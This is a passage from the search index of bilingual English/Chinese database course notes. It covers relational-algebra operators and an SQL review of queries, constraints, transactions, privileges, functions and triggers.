\\in r \\lor t \\in s \\} \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations</li> <li>\\( r \\) and \\( s \\) must have the same number of attributes. \\( r \\) \u548c \\( s \\) \u5fc5\u987b\u6709\u76f8\u540c\u6570\u91cf\u7684\u5c5e\u6027\u3002</li> <li>The attribute domains must be compatible. \u5c5e\u6027\u57df\u5fc5\u987b\u517c\u5bb9\u3002</li> </ul> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#set-difference","title":"Set Difference","text":"<p>\\( r - s = \\{ t \\mid t \\in r \\land t \\notin s \\} \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations</li> <li>Similar to Union, \\( r \\) and \\( s \\) must have the same number of attributes and the attribute domains must be compatible.</li> </ul> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#cartesian-product","title":"Cartesian Product","text":"<p>\\( r \\times s = \\{ (t_1, t_2) \\mid t_1 \\in r \\land t_2 \\in s \\} \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations</li> <li>If \\( r \\) and \\( s \\) are not disjoint, then rename will be used to avoid ambiguity between the attributes with the same name. \u5982\u679c \\( r \\) \u548c \\( s \\) \u6709\u76f8\u540c\u540d\u79f0\u7684\u5c5e\u6027\uff0c\u5219\u5c06\u4f7f\u7528 \u91cd\u547d\u540d \u6765\u907f\u514d\u5177\u6709\u76f8\u540c\u540d\u79f0\u7684\u5c5e\u6027\u4e4b\u95f4\u7684\u6b67\u4e49\u3002</li> </ul> <p>Example</p> <p>\\( r \\) \u548c \\( s \\) \u4e0d\u76f8\u4ea4\uff1a</p> <p> </p> <p>\\( r \\) \u548c \\( s \\) \u76f8\u4ea4\uff1a</p> <p> </p>"},{"location":"cs/database/chapter2/#rename","title":"Rename","text":"<ul> <li>\\( \\rho_X (E) \\): rename the expression \\(E\\) as \\(X\\).</li> <li>\\( \\rho_{X(A_1, A_2, \\ldots, A_n)} (E) \\): rename the expression \\(E\\) as \\(X\\) and the attributes as \\(A_1, A_2, \\ldots, A_n\\).</li> </ul> <p>\\( \\rho \\) returns a relation that is identical to \\(E\\) except that the relation is renamed as \\(X\\). \\( \\rho \\) \u8fd4\u56de\u4e00\u4e2a\u4e0e \\(E\\) \u76f8\u540c\u7684\u5173\u7cfb\uff0c\u53ea\u662f\u5173\u7cfb\u88ab\u91cd\u547d\u540d\u4e3a \\(X\\)\u3002</p>"},{"location":"cs/database/chapter2/#additional-relational-algebra-operations","title":"Additional Relational-Algebra Operations","text":"<p>Four additional operators:</p> <ul> <li>Set Intersection: \\( \\cap \\) \u4ea4</li> <li>Natural Join: \\( \\bowtie \\) \u81ea\u7136\u8fde\u63a5</li> <li>Division: \\( \\div \\) \u9664</li> <li>Assignment: \\( \\leftarrow \\) \u8d4b\u503c</li> </ul>"},{"location":"cs/database/chapter2/#set-intersection","title":"Set Intersection","text":"<p>\\( r \\cap s = \\{ t \\mid t \\in r \\land t \\in s \\} = r - (r - s) \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations</li> <li>\\( r \\) and \\( s \\) must have the same number of attributes and the attribute domains must be compatible.</li> </ul> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#natural-join","title":"Natural Join","text":"<p>\\( r \\bowtie s \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations</li> <li>Consider each pair of tuples \\( t_1 \\in r \\) and \\( t_2 \\in s \\), if \\( t_1 \\) and \\( t_2 \\) have the same value on each attribute in \\( R \\cap S \\), then add a tuple to the result relation with the remaining attributes from \\( t_1 \\) and \\( t_2 \\). \u5982\u679c \\( t_1 \\) \u548c \\( t_2 \\) \u5728 \\( R \\cap S \\) \u4e0a\u7684\u6bcf\u4e2a\u5c5e\u6027\u4e0a\u5177\u6709\u76f8\u540c\u7684\u503c\uff0c\u5219\u5c06\u4e00\u4e2a\u5143\u7ec4\u6dfb\u52a0\u5230\u7ed3\u679c\u5173\u7cfb\u4e2d\uff0c\u8be5\u5143\u7ec4\u5177\u6709\u6765\u81ea \\( t_1 \\) \u548c \\( t_2 \\) \u7684\u5269\u4f59\u5c5e\u6027\u3002</li> </ul> <p>Example</p> <p> </p> <p>Theta Join Operation</p> <p>\\( r \\bowtie_{\\theta} s = \\sigma_{\\theta} (r \\times s) \\)</p>"},{"location":"cs/database/chapter2/#division","title":"Division","text":"<p>\\( r \\div s = \\{ t \\mid t \\in \\Pi_{R - S} (r) \\land \\forall u \\in s, t \\times u \\in r \\} \\)</p> <ul> <li>\\( r \\) and \\( s \\) are relations on schema \\( R and S \\)</li> </ul> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#assignment","title":"Assignment","text":"<p>\\( X \\leftarrow E \\)</p> <p>Assignment is always made to a temporary relation.</p> <p>Example</p> <p>Write \\( r \\div s \\) as:</p> \\[ \\begin{align*} temp1 &amp;\\leftarrow \\Pi_{R - S} (r) \\\\ temp2 &amp;\\leftarrow \\Pi_{R - S} (temp1 \\times s - \\Pi_{R - S, S} (r)) \\\\ result &amp;\\leftarrow temp1 - temp2 \\end{align*} \\]"},{"location":"cs/database/chapter2/#extended-relational-algebra-operations","title":"Extended Relational-Algebra Operations","text":"<ul> <li>Generalized Projection: \\( \\Pi_{A_1, A_2, \\ldots, A_n} (r) \\) where \\( A_i \\) is an expression. \u5e7f\u4e49\u6295\u5f71</li> <li>Aggregation Functions: \u805a\u5408\u51fd\u6570</li> </ul>"},{"location":"cs/database/chapter2/#generalized-projection","title":"Generalized Projection","text":"<p>\\( \\Pi_{A_1, A_2, \\ldots, A_n} (r) \\) where \\( A_i \\) is an expression.</p> <p>Example</p> <p>Given a relation \\( \\text{credit_info}(\\text{customer_name}, \\text{limit}, \\text{current_balance}) \\), we can use the following expression to calculate the available credit for each customer:</p> \\[ \\Pi_{\\text{customer_name}, \\text{limit} - \\text{current_balance}} (\\text{credit_info}) \\]"},{"location":"cs/database/chapter2/#aggregation-functions","title":"Aggregation Functions","text":"<p>\\( _{G_1, G_2, \\ldots, G_n}g_{F_1(A_1), F_2(A_2), \\ldots, F_n(A_n)} (r) \\)</p> <ul> <li>\\( r \\) is a relation</li> <li>\\( A_i \\) is an attribute of \\( r \\)</li> <li>\\( F_i \\) is an aggregation function, such as<ul> <li>avg: average value</li> <li>sum: sum of values</li> <li>count: number of tuples</li> <li>max: maximum value</li> <li>min: minimum value</li> </ul> </li> <li>\\( G_i \\) is a grouping attribute(can be empty)</li> </ul> <p>Example</p> <p> </p> <p>Info</p> <p>Result of aggregation does not have a name. \u805a\u5408\u7684\u7ed3\u679c\u6ca1\u6709\u540d\u79f0\uff0c\u9700\u8981\u91cd\u547d\u540d\u6216\u8005\u5728\u805a\u5408\u64cd\u4f5c\u4e2d\u6307\u5b9a\u540d\u79f0\u3002</p> <p>Example:</p> \\[ _\\text{branch-name} g_{\\text{sum}(\\text{balance}) \\ as \\ \\text{sum-balance}} (\\text{account}) \\]"},{"location":"cs/database/chapter2/#modification-of-the-database","title":"Modification of the Database","text":"<ul> <li>Deletion</li> <li>Insertion</li> <li>Updating</li> </ul>"},{"location":"cs/database/chapter2/#deletion","title":"Deletion","text":"<p>\\( r \\leftarrow r - E \\)</p> <ul> <li>\\( r \\) is a relation</li> <li>\\( E \\) is a relational-algebra expression</li> </ul>"},{"location":"cs/database/chapter2/#insertion","title":"Insertion","text":"<p>\\( r \\leftarrow r \\cup E \\)</p>"},{"location":"cs/database/chapter2/#updating","title":"Updating","text":"<p>\\( r \\leftarrow \\Pi_{F_1, F_2, \\ldots, F_n} (r) \\)</p> <ul> <li>\\( r \\) is a relation</li> <li>\\( F_i \\) is an attribute of \\( r \\) or an expression which gives the new value of the attribute</li> </ul>"},{"location":"cs/database/review/","title":"\u590d\u4e60","text":""},{"location":"cs/database/review/#_2","title":"\u57fa\u672c\u6982\u5ff5\u548c\u5173\u7cfb\u4ee3\u6570","text":""},{"location":"cs/database/review/#relational-database","title":"\u5173\u7cfb\u578b\u6570\u636e\u5e93 Relational Database","text":"<p>\u4e00\u7cfb\u5217\u8868\u7684\u96c6\u5408\uff0c\u4e00\u5f20\u8868\u662f\u4e00\u4e2a\u57fa\u672c\u5355\u4f4d\uff0c\u8868\u4e2d\u7684\u6bcf\u4e00\u884c\u662f\u4e00\u4e2a\u5173\u7cfb\u3002</p>"},{"location":"cs/database/review/#_3","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>relation \u4e00\u6761\u5173\u7cfb\u662f\u4e00\u4e2a\u5143\u7ec4 tuple</li> <li>attribute \u5c5e\u6027\u6307\u8868\u4e2d\u7684\u5217\u540d<ul> <li>attribute type \u6307\u5c5e\u6027\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5982 int, varchar</li> <li>attribute value \u6307\u5c5e\u6027\u7684\u503c<ul> <li>domain \u53d6\u503c\u8303\u56f4 \\(D\\)\uff0c\u4e00\u6761\u5173\u7cfb r \u662f \\(D_1 \\times D_2 \\times \\cdots \\times D_n\\) \u7684\u5b50\u96c6</li> <li>\u5c5e\u6027\u503c\u662f atomic \u7684\uff0c\u4e0d\u53ef\u518d\u5206</li> </ul> </li> </ul> </li> <li>relation schema \u5173\u7cfb\u6a21\u5f0f<ul> <li>\u6307\u8868\u7684\u7ed3\u6784\uff0c\\(R = (A_1, A_2, \\cdots, A_n)\\)\uff0c\u5176\u4e2d \\(A_i\\) \u662f\u5c5e\u6027\u540d</li> <li>\\(r(R)\\) \u8868\u793a\u5173\u7cfb r \u7684 schema \u662f R\uff0cr \u662f\u8868\u4e2d\u7684\u4e00\u884c\u3002</li> <li>\u5173\u7cfb\u662f\u65e0\u5e8f\u7684\u3002</li> </ul> </li> <li>keys \u952e<ul> <li>super key \u8d85\u952e\uff0c\u552f\u4e00\u6807\u8bc6\u4e00\u6761\u8bb0\u5f55\u7684\u5c5e\u6027\u96c6\u5408\uff0c\u53ef\u4ee5\u5197\u4f59\uff0c\u5982 \\(A\\) \u662f super key\uff0c\u90a3\u4e48 \\((A, B)\\) \u4e5f\u662f super key</li> <li>candidate key \u5019\u9009\u952e\uff0c\u6700\u5c0f\u7684\u8d85\u952e\uff0c\u6ca1\u6709\u5197\u4f59\u5c5e\u6027</li> <li>primary key \u4e3b\u952e\uff0c\u5019\u9009\u952e\u4e2d\u9009\u62e9\u4e00\u4e2a\u4f5c\u4e3a\u4e3b\u952e\uff0c\u5728\u5efa\u8868\u65f6\u6307\u5b9a</li> <li>foreign key \u5916\u952e\uff0c\u4e00\u4e2a\u8868\u4e2d\u7684\u5c5e\u6027\uff0c\u6307\u5411\u53e6\u4e00\u4e2a\u8868\u7684\u4e3b\u952e</li> </ul> </li> </ul>"},{"location":"cs/database/review/#_4","title":"\u5173\u7cfb\u4ee3\u6570","text":"<ul> <li>select \u9009\u62e9\uff1a\\(\\sigma_{p}(r)\\)\uff0c\u9009\u62e9\u6ee1\u8db3\u6761\u4ef6 \\(p\\) \u7684\u5143\u7ec4</li> <li>project \u6295\u5f71\uff1a\\(\\Pi_{A_1, A_2, \\cdots, A_n}(r)\\)\uff0c\u9009\u62e9\u5c5e\u6027 \\(A_1, A_2, \\cdots, A_n\\) \u7684\u5143\u7ec4\uff0c\u7ed3\u679c\u53bb\u91cd</li> <li>union \u5e76\uff1a\\(r \\cup s\\)\uff0c\u4e24\u4e2a\u5173\u7cfb\u7684\u5e76\u96c6\uff0c\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u4e2a\u6570\u76f8\u540c\uff0c\u4e14\u5bf9\u5e94\u5c5e\u6027\u7684\u7c7b\u578b\u76f8\u540c\u3002</li> <li>set difference \u5dee\uff1a\\(r - s\\)\uff0c\u4e24\u4e2a\u5173\u7cfb\u7684\u5dee\u96c6\uff0c\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u4e2a\u6570\u76f8\u540c\uff0c\u4e14\u5bf9\u5e94\u5c5e\u6027\u7684\u7c7b\u578b\u76f8\u540c\u3002</li> <li>Cartesian product \u7b1b\u5361\u5c14\u79ef\uff1a\\(r \\times s\\)\uff0c\u4e24\u4e2a\u5173\u7cfb\u7684\u7b1b\u5361\u5c14\u79ef\uff0c\u7ed3\u679c\u7684\u5c5e\u6027\u4e2a\u6570\u662f\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u4e2a\u6570\u4e4b\u548c\uff0c\u5c5e\u6027\u7684\u7c7b\u578b\u662f\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u7c7b\u578b\u7684\u5e76\u96c6\u3002</li> <li>rename \u91cd\u547d\u540d\uff1a\\(\\rho_X(E)\\) \u5f15\u7528</li> <li>intersection \u4ea4\uff1a\\(r \\cap s = r - (r - s)\\)</li> <li>natural join \u81ea\u7136\u8fde\u63a5\uff1a\\(r \\bowtie s\\)\uff0c\u540c\u540d\u5c5e\u6027\u76f8\u540c\u7684\u7ec4\u5408\u6210\u4e00\u6761\u8bb0\u5f55\u3002\\(r \\bowtie_\\theta s = \\sigma_\\theta(r \\bowtie s)\\)</li> <li>outer join \u5916\u90e8\u8fde\u63a5<ul> <li>\u5de6\u5916\u8fde\u63a5 \\(r \\ltimes s\\)\uff0c\u5de6\u8fb9\u7684\u8868\u5168\u90e8\u4fdd\u7559\uff0c\u53f3\u8fb9\u7684\u8868\u4e2d\u6ca1\u6709\u7684\u7528 null \u586b\u5145</li> <li>\u53f3\u5916\u8fde\u63a5 \\(r \\rtimes s\\)\uff0c\u53f3\u8fb9\u7684\u8868\u5168\u90e8\u4fdd\u7559\uff0c\u5de6\u8fb9\u7684\u8868\u4e2d\u6ca1\u6709\u7684\u7528 null \u586b\u5145</li> <li>\u5168\u5916\u8fde\u63a5 \\(r \\Join s\\)\uff0c\u4e24\u4e2a\u8868\u4e2d\u7684\u6240\u6709\u8bb0\u5f55\u90fd\u4fdd\u7559\uff0c\u6ca1\u6709\u7684\u7528 null \u586b\u5145</li> </ul> </li> <li>division \u9664\u6cd5\uff1a\\(r \\div s\\)\uff0c\u8bbe \\(R = (A_1, A_2, \\cdots, A_n, B_1, B_2, \\cdots, B_m)\\)\uff0c\\(S = (B_1, B_2, \\cdots, B_m)\\)\uff0c\\(R \\div S = (A_1, A_2, \\cdots, A_n)\\)\uff0c\u8868\u4e2d\u4fdd\u7559\u7684\u884c \\(t\\) \u6ee1\u8db3 \\(\\forall u \\in s, t \\times u \\in r\\)</li> <li>assignment \u8d4b\u503c\uff1a\\(\\leftarrow\\)\uff0c\u5c06\u64cd\u4f5c\u7684\u7ed3\u679c\u8fdb\u884c\u547d\u540d\u3002</li> <li>aggregation \u805a\u5408\uff1a\\(_{G_1, G_2, \\cdots, G_n}\\mathcal{G}_{F_1(A_1), F_2(A_2), \\cdots, F_m(A_m)}(r)\\)\uff0c\u5bf9\u5173\u7cfb r \u4e2d \\(G_i\\) \u76f8\u540c\u7684\u5143\u7ec4\u8fdb\u884c\u805a\u5408\uff0c\u7136\u540e\u5728\u5206\u522b\u5728\u5c5e\u6027 \\(A_i\\) \u4e0a\u8fdb\u884c\u805a\u5408\u64cd\u4f5c \\(F_i\\)\uff0c\u5982 count, sum, avg, max, min</li> </ul>"},{"location":"cs/database/review/#sql","title":"SQL","text":""},{"location":"cs/database/review/#_5","title":"\u6570\u636e\u7c7b\u578b","text":"<p>char\uff08\u5b9a\u957f\u5b57\u7b26\u4e32\uff09\u3001varchar\uff08\u53d8\u957f\u5b57\u7b26\u4e32\uff09\u3001int\u3001float\u3001date\u3001time\u3001timestamp\u3001numeric(p,d)\uff08p \u6709\u6548\u6570\u5b57\u4f4d\u6570\uff0cd \u5c0f\u6570\u4f4d\u6570\uff09</p>"},{"location":"cs/database/review/#_6","title":"\u521b\u5efa\u66f4\u65b0\u5220\u9664","text":"<ul> <li>\u521b\u5efa\u8868     <pre><code>CREATE TABLE table_name (\n    column_name1 data_type1,\n    column_name2 data_type2,\n    ...\n    -- intergrity constraints\n);\n</code></pre>     \u5b8c\u6574\u6027\u7ea6\u675f\u6307\u5b9a <code>primary key(x)</code>\u3001 <code>foreign key(x) references r</code></li> <li>\u5220\u9664 <code>drop table table_name</code></li> <li>\u66f4\u65b0\u5c5e\u6027 <code>alter table table_name add column_name data_type</code>\u3001<code>alter table table_name drop column_name</code></li> </ul>"},{"location":"cs/database/review/#_7","title":"\u67e5\u8be2","text":"<p><code>select * from table_name</code></p> <ul> <li>\u53bb\u91cd <code>select distinct * from table_name</code>\uff0c\u4e0d\u53bb\u91cd <code>select all * from table_name</code></li> <li>from \u5b57\u53e5\u4e2d\u9009\u62e9\u591a\u4e2a\u8868\uff0c\u4f1a\u5148\u8fdb\u884c\u7b1b\u5361\u5c14\u79ef</li> <li>\u8f93\u51fa\u7ed3\u679c\u6392\u5e8f <code>select * from table_name order by column_name asc/desc</code></li> <li>\u96c6\u5408\u64cd\u4f5c <code>union</code>, <code>intersect</code>, <code>except</code> \u8fde\u63a5\u4e24\u6761\u67e5\u8be2\u7ed3\u679c\uff0c\u4f7f\u7528 <code>union all</code> \u53ef\u4ee5\u4fdd\u7559\u91cd\u590d\u7684\u884c</li> <li>\u805a\u5408\u64cd\u4f5c     <pre><code>select count(*) from table_name group by column_name\n</code></pre><ul> <li>having \u5bf9\u5206\u7ec4\u8fdb\u884c\u7b5b\u9009     <pre><code>select count(*) from table_name\ngroup by column_name having count(*) &gt; 1\n</code></pre></li> </ul> </li> <li>\u5d4c\u5957\u67e5\u8be2<ul> <li>\u7528 <code>in</code> \u6216\u8005 <code>not in</code> \u5224\u65ad\u662f\u5426\u5728\u5b50\u67e5\u8be2\u7684\u7ed3\u679c\u4e2d     <pre><code>select * from table_name\nwhere column_name in (select column_name from table_name)\n</code></pre></li> <li>\u7528 <code>all</code> \u6216\u8005 <code>some</code> \u8fdb\u884c\u6bd4\u8f83     <pre><code>select * from table_name\nwhere column_name &gt; all (select column_name from table_name)\n</code></pre></li> <li>\u7528 <code>exists</code> \u6216\u8005 <code>not exists</code> \u5224\u65ad\u5b50\u67e5\u8be2\u662f\u5426\u4e3a\u7a7a     <pre><code>select * from table_name as T1, table_name as T2\nwhere T1.column_name = T2.column_name and exists (\n    select * from table_name as T3\n    where T3.column_name = T1.column_name\n)\n</code></pre></li> <li>\u7528 <code>unique</code> \u5224\u65ad\u5b50\u67e5\u8be2\u662f\u5426\u4e3a\u96c6\u5408</li> </ul> </li> <li><code>with</code> \u6784\u5efa\u4e34\u65f6\u8868     <pre><code>with table_name(column_name) as (\n    select column_name1 from table_name1\n)\nselect * from table_name\n</code></pre></li> <li><code>join</code> \u8fde\u63a5\uff0c\u4f7f\u7528 <code>join</code> \u65f6\u9ed8\u8ba4\u662f <code>inner join</code><ul> <li><code>natural join</code> \u81ea\u7136\u8fde\u63a5\uff0c\u8fde\u63a5\u4e24\u4e2a\u8868\u4e2d\u540c\u540d\u7684\u5c5e\u6027</li> <li><code>inner join</code> \u5185\u8fde\u63a5\uff0c\u8fde\u63a5\u4e24\u4e2a\u8868\u4e2d\u6ee1\u8db3\u6761\u4ef6\u7684\u5c5e\u6027     <pre><code>select * from table_name1 inner join table_name2\non table_name1.column_name = table_name2.column_name\n</code></pre></li> <li><code>left join</code> \u5de6\u8fde\u63a5\uff0c\u4fdd\u7559\u5de6\u8868\u4e2d\u7684\u6240\u6709\u884c</li> <li><code>right join</code> \u53f3\u8fde\u63a5\uff0c\u4fdd\u7559\u53f3\u8868\u4e2d\u7684\u6240\u6709\u884c</li> <li><code>full join</code> \u5168\u8fde\u63a5\uff0c\u4fdd\u7559\u4e24\u4e2a\u8868\u4e2d\u7684\u6240\u6709\u884c</li> </ul> </li> </ul>"},{"location":"cs/database/review/#_8","title":"\u63d2\u5165\u5220\u9664\u66f4\u65b0","text":"<ul> <li>\u63d2\u5165 <code>insert into table_name values (value1, value2, ...)</code></li> <li>\u5220\u9664 <code>delete from table_name where column_name = value</code></li> <li>\u66f4\u65b0 <code>update table_name set column_name = value where column_name = value</code> <code>case</code> \u5b50\u53e5\u7528\u4e8e\u5206\u7c7b\u8ba8\u8bba     <pre><code>update table_name\nset column_name = case\n    when condition1 then value1\n    when condition2 then value2\n    else value3\nend\nwhere column_name = value\n</code></pre></li> </ul>"},{"location":"cs/database/review/#_9","title":"\u89c6\u56fe\u3001\u7d22\u5f15","text":"<ul> <li>\u89c6\u56fe <code>create view view_name as (select * from table_name)</code><ul> <li>\u4e0d\u4f1a\u521b\u5efa\u65b0\u7684\u8868\uff0c\u53ea\u662f\u9690\u85cf\u4e86\u67e5\u8be2\u7684\u7ec6\u8282</li> <li>\u53ef\u4ee5\u7528 <code>insert</code> \u8fdb\u884c\u66f4\u65b0\uff0c\u6709\u9650\u5236\uff1a<ul> <li>\u521b\u5efa\u89c6\u56fe\u65f6\u53ea\u7528\u4e86\u4e00\u4e2a\u8868</li> <li>\u6ca1\u6709 <code>distinct</code> \u548c\u805a\u5408\u64cd\u4f5c</li> <li>\u6ca1\u6709\u7a7a\u503c\u548c default \u503c</li> </ul> </li> </ul> </li> <li>\u7d22\u5f15 <code>create index index_name on table_name(column_name)</code></li> </ul>"},{"location":"cs/database/review/#type-domain","title":"type \u548c domain","text":"<ul> <li>\u7528\u6237\u5b9a\u4e49 type     <pre><code>create type type_name as numeric(10, 2) final\n</code></pre></li> <li>\u7528\u6237\u5b9a\u4e49 domain     <pre><code>create domain domain_name as numeric(10, 2)\n</code></pre></li> </ul> <p>\u4e0d\u540c type \u7684\u53d8\u91cf\u4e0d\u80fd\u76f8\u4e92\u8fd0\u7b97\uff0c\u57fa\u7840\u7c7b\u578b\u76f8\u540c\u7684 domain \u53ef\u4ee5\u76f8\u4e92\u8fd0\u7b97\u3002</p>"},{"location":"cs/database/review/#_10","title":"\u5b8c\u6574\u6027\u7ea6\u675f","text":"<ul> <li>not null \u503c\u4e0d\u80fd\u4e3a\u7a7a</li> <li>unique \u503c\u552f\u4e00</li> <li>primary key \u4e3b\u952e</li> <li>check \u68c0\u67e5\u7ea6\u675f     <pre><code>create table table_name (\n    column_name1 data_type1 check (column_name1 &gt; 0),\n    column_name2 data_type2,\n    check (column_name2 in ('value1', 'value2'))\n)\n</code></pre></li> <li>\u5f15\u7528\u5b8c\u6574\u6027\u7ea6\u675f     <pre><code>create table table1 (\n    primarykey1 data_type1 primary key\n)\ncreate table table2 (\n    primarykey2 data_type2 primary key,\n    foreignkey data_type2 references table1(primarykey1)\n)\n</code></pre></li> <li>\u7ea7\u8054\u64cd\u4f5c<ul> <li><code>on delete cascade</code> \u5220\u9664\u4e3b\u8868\u4e2d\u7684\u8bb0\u5f55\u65f6\uff0c\u4ece\u8868\u4e2d\u7684\u8bb0\u5f55\u4e5f\u4f1a\u88ab\u5220\u9664     \u6bd4\u5982\u5220\u9664 <code>table1</code> \u4e2d\u7684\u8bb0\u5f55 \\(r\\)\uff0c<code>table2</code> \u4e2d <code>foreignkey</code> \u6307\u5411 \\(r\\) \u7684\u8bb0\u5f55\u4e5f\u4f1a\u88ab\u5220\u9664</li> <li><code>on update cascade</code> \u66f4\u65b0\u4e3b\u8868\u4e2d\u7684\u8bb0\u5f55\u65f6\uff0c\u4ece\u8868\u4e2d\u7684\u8bb0\u5f55\u4e5f\u4f1a\u88ab\u66f4\u65b0</li> </ul> </li> </ul>"},{"location":"cs/database/review/#_11","title":"\u4e8b\u52a1","text":"<p>\u4e8b\u52a1\u662f\u4e00\u7cfb\u5217\u64cd\u4f5c\u7684\u96c6\u5408\uff0c\u8981\u4e48\u5168\u90e8\u6267\u884c\uff0c\u8981\u4e48\u5168\u90e8\u56de\u6eda\uff0c\u7531 <code>begin</code>, <code>commit</code>, <code>rollback</code> \u63a7\u5236\u3002</p> <p>ACID \u7279\u6027\uff1a</p> <ul> <li>atomicity \u539f\u5b50\u6027\uff1a\u4e8b\u52a1\u662f\u4e00\u4e2a\u4e0d\u53ef\u5206\u5272\u7684\u5de5\u4f5c\u5355\u4f4d\uff0c\u8981\u4e48\u5168\u90e8\u6267\u884c\uff0c\u8981\u4e48\u5168\u90e8\u56de\u6eda</li> <li>consistency \u4e00\u81f4\u6027\uff1a\u4e8b\u52a1\u6267\u884c\u524d\u540e\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\u7ea6\u675f\u6ca1\u6709\u88ab\u7834\u574f</li> <li>isolation \u9694\u79bb\u6027\uff1a\u4e8b\u52a1\u4e4b\u95f4\u662f\u76f8\u4e92\u9694\u79bb\u7684\uff0c\u4e00\u4e2a\u4e8b\u52a1\u7684\u6267\u884c\u4e0d\u4f1a\u5f71\u54cd\u5176\u4ed6\u4e8b\u52a1</li> <li>durability \u6301\u4e45\u6027\uff1a\u4e8b\u52a1\u6267\u884c\u6210\u529f\u540e\uff0c\u5bf9\u6570\u636e\u5e93\u7684\u4fee\u6539\u662f\u6c38\u4e45\u7684</li> </ul>"},{"location":"cs/database/review/#authoization","title":"\u6743\u9650 authoization","text":"<p>\u5206\u7c7b\uff1a</p> <ul> <li>\u6570\u636e\u5c42\u9762\uff1a<code>select</code>, <code>insert</code>, <code>update</code>, <code>delete</code></li> <li>\u6570\u636e\u5e93\u5c42\u9762\uff1a<code>create</code>, <code>drop</code>, <code>alter</code></li> </ul> <p>\u57fa\u672c\u64cd\u4f5c\uff1a</p> <ul> <li><code>grant</code> \u6388\u6743     <pre><code>grant &lt;privilege_list&gt; on &lt;relation_name or view_name&gt; to &lt;user_list&gt;\n</code></pre>     user_list \u53ef\u4ee5\u662f user \u6216\u8005 role \u6216\u8005 public \u4ee3\u8868\u6240\u6709\u7528\u6237     <pre><code>grant select on table_name to user1\ngrant update(column_name) on table_name to user1\ngrant all privileges on table_name to user1\n</code></pre></li> <li><code>revoke</code> \u64a4\u9500\u6743\u9650\uff0c\u7528\u6cd5\u548c <code>grant</code> \u7c7b\u4f3c</li> </ul>"},{"location":"cs/database/review/#role","title":"role","text":"<p>\u4e00\u7ec4\u6743\u9650\u7684\u96c6\u5408\uff0c\u53ef\u4ee5\u8d4b\u4e88\u7528\u6237\u6216\u8005\u5176\u4ed6\u89d2\u8272\u3002</p> <ul> <li>\u521b\u5efa <code>create role role_name</code></li> <li>\u8d4b\u4e88\u6743\u9650 <code>grant select on table_name to role_name</code></li> <li>\u8d4b\u4e88\u7528\u6237 <code>grant role_name to user_name</code></li> <li>\u8d4b\u4e88\u5176\u4ed6\u89d2\u8272 <code>grant role_name1 to role_name2</code></li> </ul>"},{"location":"cs/database/review/#_12","title":"\u5176\u4ed6","text":"<ul> <li>\u5f15\u7528\u6743\u9650\uff0c\u51b3\u5b9a\u662f\u5426\u80fd\u591f\u901a\u8fc7\u5916\u952e\u7ea6\u675f\u5220\u9664\u6216\u8005\u66f4\u65b0\u5176\u4ed6\u8868\u4e2d\u7684\u8bb0\u5f55     <pre><code>grant references(column_name) on table_name to user1\n</code></pre></li> <li>\u7ea7\u8054\u6743\u9650<ul> <li><code>grant select on table_name to user1 with grant option</code>\uff0cuser1 \u53ef\u4ee5\u5c06 select \u6743\u9650\u6388\u4e88\u5176\u4ed6\u7528\u6237</li> <li><code>revoke select on table_name from user1 cascade</code>\uff0c\u7ea7\u8054\u64a4\u9500\u6743\u9650</li> <li><code>revoke select on table_name from user1 restrict</code>\uff0c\u53ea\u64a4\u9500 user1 \u7684\u6743\u9650</li> <li><code>revoke grant option for select on table_name from user1</code>\uff0c\u64a4\u9500 user1 \u7684\u6388\u6743\u6743\u9650</li> </ul> </li> </ul>"},{"location":"cs/database/review/#_13","title":"\u51fd\u6570","text":"<pre><code>create function dep_count(department_name varchar)\nreturns integer\nbegin\n    declare count integer;\n    select count(*) into count\n    from employee\n    where department = department_name;\n    return count;\nend\n</code></pre> <p>\u8fd4\u56de\u503c\u53ef\u4ee5\u662f table\uff1a</p> <pre><code>create function get_employee()\nreturns table(name varchar, department varchar)\nbegin\n    return table(\n        select name, department\n        from employee\n    );\nend\n</code></pre>"},{"location":"cs/database/review/#procedural-constructs","title":"Procedural Constructs \u8fc7\u7a0b\u5316\u7ed3\u6784","text":"<ul> <li>while \u5faa\u73af     <pre><code>begin\n    declare count integer;\n    set count = 0;\n    while count &lt; 10 do\n        set count = count + 1;\n    end while;\nend\n</code></pre></li> <li>repeat \u5faa\u73af\uff0c\u76f8\u5f53\u4e8e do while     <pre><code>begin\n    declare count integer;\n    set count = 0;\n    repeat\n        set count = count + 1;\n    until count = 10\n    end repeat;\nend\n</code></pre></li> <li>for \u5faa\u73af\uff0c\u679a\u4e3e\u67e5\u8be2\u7ed3\u679c\u7684\u6bcf\u4e00\u884c     <pre><code>begin\n    declare sum integer;\n    for r as select * from table_name do\n        set sum = sum + r.column_name;\n    end for;\nend\n</code></pre></li> </ul>"},{"location":"cs/database/review/#_14","title":"\u89e6\u53d1\u5668","text":"<p>ECA rule:</p> <ul> <li>event \u4e8b\u4ef6\uff0c\u89e6\u53d1\u5668\u7684\u89e6\u53d1\u4e8b\u4ef6\uff0c\u6bd4\u5982 insert, update, delete</li> <li>condition \u6761\u4ef6\uff0c\u89e6\u53d1\u5668\u7684\u6267\u884c\u6761\u4ef6</li> <li>action \u52a8\u4f5c\uff0c\u89e6\u53d1\u5668\u89e6\u53d1\u540e\u6267\u884c\u7684\u52a8\u4f5c</li> </ul> <pre><code>create trigger trigger_name\nafter update of column_name on table_name -- event\nreferencing new row as nrow\nreferencing old row as orow\nfor each row\nwhen (nrow.column_name &lt;&gt; orow.column_name) -- condition\nbegin -- action\n    insert into log_table values (nrow.column_name);\nend\n</code></pre>"},{"location":"cs/database/review/#entity-relationship-model","title":"Entity-Relationship Model","text":""},{"location":"cs/database/review/#er","title":"ER \u6a21\u578b","text":"<p>\u7531\u5173\u7cfb\u548c\u5b9e\u4f53\u7ec4\u6210\u3002</p> <ul> 